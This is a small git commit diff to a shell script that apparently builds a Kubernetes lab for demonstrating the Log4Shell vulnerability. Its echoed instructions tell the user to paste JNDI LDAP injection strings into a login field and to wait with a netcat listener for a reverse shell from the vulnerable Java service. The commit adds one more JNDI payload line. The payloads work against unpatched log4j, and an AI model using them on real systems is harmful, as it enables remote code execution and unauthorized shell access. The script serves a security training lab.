a5588f82a3945360606f05ff2b7a995b22ddc2be
buchmann <buchmann@users.noreply.github.com>
2022-03-09 15:06:04 +0100

    Update build-log4j.sh

--- build-log4j.sh
+++ build-log4j.sh
@@ -14,6 +14,7 @@ kubectl -n log4j get svc
 echo " Open a browser http://public IP worker node for cve-web-deployment pod :32080/log4shell"
 echo " paste ${jndi:ldap://IP-of-workernode:32095/a} replace IP with : "$masternode" in Userfield at login Browser in order start connection "
 echo " Open a shell to the masternode execute : nc -lv " $masternode "9001  to wait for a shell connection from cve-web-service where the java code runs "
+echo " general "${jndi:ldap://172.16.238.11:1389/a}"
 
 
 
